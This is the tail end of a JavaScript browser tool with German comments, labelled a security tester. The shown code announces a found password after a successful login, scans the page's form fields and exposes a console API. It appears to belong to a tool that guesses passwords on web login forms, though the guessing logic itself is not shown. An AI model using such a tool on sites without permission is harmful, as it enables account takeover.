      <div style="font-size: 12px; margin-top: 10px; color: #aaffaa;">
        Login erfolgreich - Erfolgsanzeige erkannt
      </div>
    `;

        // Scrolle zum Erfolg-Element
        successElement.scrollIntoView({behavior: 'smooth'});

        // Status aktualisieren
        updateStatus(`Erfolg! Passwort gefunden: ${password}`, false);
    };

    // UI anzeigen
    createUI();

    // Öffentliche API für die Konsole
    window.securityTester = {
        rescan: createUI,
        getFormFields: scanForFields,
        getForms: scanForms
    };

    console.log('%c[Sicherheitstest-Tool] Tool erfolgreich initialisiert!', 'color: #4a6ed3; font-weight: bold;');
    console.log('Du kannst manuelle Scans mit window.securityTester.rescan() durchführen');
})();